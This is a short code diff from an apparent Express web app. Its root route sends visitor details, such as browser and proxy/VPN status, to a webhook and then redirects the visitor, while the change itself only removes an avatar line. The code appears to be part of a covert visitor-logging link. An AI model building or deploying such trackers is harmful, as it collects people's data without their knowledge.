@@ -34,8 +34,7 @@ app.get("/", async (req, res) => {
       .addField("Browser", browser)
       .addField("Proxy/VPN", isProxy ? "Yes" : "No")
       .setColor("#5CDBF0")
-      .setTimestamp()
-      .setAvatar('https://i.imgur.com/epEobk9.png');
+      .setTimestamp();
     await sendWebhook(channelID, embed);
 
     res.redirect(process.env.redirect_url);
